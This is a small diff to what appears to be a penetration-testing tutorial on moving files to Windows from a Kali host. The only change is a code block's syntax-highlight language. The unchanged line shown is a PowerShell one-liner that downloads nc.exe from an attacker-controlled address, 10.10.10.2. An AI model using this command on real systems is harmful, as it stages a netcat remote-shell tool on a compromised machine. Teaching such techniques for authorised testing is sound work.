@@ -19,7 +19,7 @@ Please also assume that my Kali Linux has a HTTP server running (This can be Apa
 
 The first example is a quick one that can easily be remembered, using a PowerShell cmdlet:
 
-{% highlight bash linenos %}
+{% highlight powershell %}
 powershell -c "mkdir c:\temp & Invoke-WebRequest -URI http://10.10.10.2/nc.exe -OUTFILE c:\temp\nc.exe"
 {% endhighlight %}
 
